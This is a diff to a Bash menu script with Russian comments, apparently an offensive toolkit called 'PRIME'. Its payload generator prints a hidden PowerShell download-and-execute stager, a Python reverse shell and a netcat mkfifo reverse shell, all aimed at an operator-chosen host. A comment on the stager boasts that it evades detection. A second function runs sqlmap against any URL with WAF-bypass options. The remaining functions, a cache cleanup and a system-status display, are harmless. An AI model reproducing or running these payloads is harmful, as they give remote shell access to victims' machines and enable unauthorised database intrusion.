@@ -439,6 +439,83 @@ run_repair() {
     sleep 2
 }
 
+pc_gen_payload() {
+    clear
+    echo -e "${R}--------------------------------------------------${NC}"
+    echo -e "${R}---        PRIME NATIVE PAYLOAD GEN            ---${NC}"
+    echo -e "${R}--------------------------------------------------${NC}"
+    
+    # Автоматически берем текущий IP, если он доступен
+    local DEFAULT_IP=$CURRENT_IP
+    read -p "LHOST (Default: $DEFAULT_IP): " lh
+    lh=${lh:-$DEFAULT_IP}
+    read -p "LPORT (Default: 4444): " lp
+    lp=${lp:-4444}
+    
+    echo -e "\n${Y}[*] Выберите тип нагрузки:${NC}"
+    echo -e "1) Windows PowerShell (Stager)\n2) Python Cross-Platform\n3) Netcat (Quick Connect)"
+    read -p ">> " p_type
+
+    echo -e "\n${G}--- СКОПИРУЙТЕ PAYLOAD ---${NC}"
+    case $p_type in
+        1) # Не детектируется как .exe, выполняется прямо в памяти
+           echo -e "${W}powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://$lh:$lp/s.ps1')\"${NC}" ;;
+        2) # Универсальный вариант для Linux/Mac/PC
+           echo -e "${W}python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$lh\",$lp));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'${NC}" ;;
+        3) # Классика
+           echo -e "${W}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lh $lp >/tmp/f${NC}" ;;
+    esac
+    echo -e "---------------------------------------"
+    pause
+}
+
+
+run_sqlmap() {
+    clear
+    echo -e "${B}--- SQLMAP SMART ATTACK ---${NC}"
+    read -p "Целевой URL: " u
+    if [ -n "$u" ]; then
+        # --batch: не задает лишних вопросов
+        # --random-agent: маскировка под разные браузеры
+        # --tamper=space2comment: обход простых фаерволов (WAF)
+        echo -e "${Y}[*] Инициализация SQL-инъекции...${NC}"
+        sqlmap -u "$u" --batch --random-agent --tamper=space2comment --level=1 --risk=1
+    fi
+    pause
+}
+
+run_repair() {
+    clear
+    echo -e "${Y}[*] Выполнение протокола очистки и восстановления...${NC}"
+    
+    # Вызов твоей системной функции
+    repair 
+    
+    # Дополнительная очистка логов и временных файлов
+    rm -rf /root/.cache/* 2>/dev/null
+    echo -e "${G}[+] Система оптимизирована. Права доступа восстановлены.${NC}"
+    pause
+}
+
+run_system_info() {
+    clear
+    echo -e "${B}--------------------------------------------------${NC}"
+    echo -e "${G}           PRIME MASTER: SYSTEM STATUS            ${NC}"
+    echo -e "${B}--------------------------------------------------${NC}"
+    
+    # Твоя функция из начала скрипта
+    get_stats
+    
+    echo -e "\n${W}Интерфейсы:${NC}"
+    ip -brief addr | grep "UP"
+    
+    echo -e "\n${W}Свободное место:${NC}"
+    df -h / | awk 'NR==2 {print $4 " доступно из " $2}'
+    
+    echo -e "${B}--------------------------------------------------${NC}"
+    pause
+}
+
 
 
 
